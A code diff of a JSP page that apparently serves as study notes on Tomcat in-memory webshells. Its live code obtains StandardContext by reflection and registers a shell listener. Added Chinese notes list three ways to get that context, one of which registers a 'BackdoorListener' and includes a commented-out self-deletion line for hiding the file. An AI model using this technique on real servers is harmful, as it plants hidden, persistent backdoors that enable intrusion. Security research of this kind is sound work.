@@ -47,12 +47,11 @@
     Field reqF = request.getClass().getDeclaredField("request");
     reqF.setAccessible(true);
     Request req = (Request) reqF.get(request);
-    StandardContext context = (StandardContext) req.getContext();
+    StandardContext standardContext = (StandardContext) req.getContext();
 
     Shell_Listener shell_listener = new Shell_Listener();
-    context.addApplicationEventListener(shell_listener);
+    standardContext.addApplicationEventListener(shell_listener);
 %>
-
 
 
 
@@ -71,6 +70,40 @@
             （1）使用Controller可以直接访问jsp页面；  如果是使用war形式 + 配置前后缀，也可以直接访问jsp页面！
             （2）giaogiao！！！  我想吐槽的是，如果通过Controller去跳转jsp内存马页面，这种情况下会直接报错并抛出异常，导致jsp页面不能完成渲染执行！！！
     <br>
+
+    <br>
+        <h1>
+        <h3>在jsp中如何获得StandardContext对象:</h3>
+
+        <h5>方式一：</h5>
+            <p>
+                Field reqF = request.getClass().getDeclaredField("request");<br>
+                reqF.setAccessible(true);<br>
+                Request req = (Request) reqF.get(request);<br>
+                StandardContext context = (StandardContext) req.getContext();<br>
+            </p>
+
+        <h5>方式二：</h5>
+            <p>
+                WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();<br>
+                StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();<br>
+            </p>
+
+        <h5>方式三：</h5>
+            <p>
+                // 通过反射从ApplicationContextFacade中获取到当前的StandardContext<br>
+                ServletContext servletContext =  request.getSession().getServletContext();<br>
+                Field field = servletContext.getClass().getDeclaredField("context");<br>
+                field.setAccessible(true);<br>
+                ApplicationContext applicationContext = (ApplicationContext) field.get(servletContext);<br>
+                field = applicationContext.getClass().getDeclaredField("context");<br>
+                field.setAccessible(true);<br>
+                StandardContext standardContext = (StandardContext) field.get(applicationContext);<br>
+                standardContext.addApplicationEventListener(new BackdoorListener());<br>
+                // 自毁    // (new File(application.getRealPath(request.getServletPath()))).delete();<br>
+            </p>
+    <br>
+
 </body>
 </html>
 
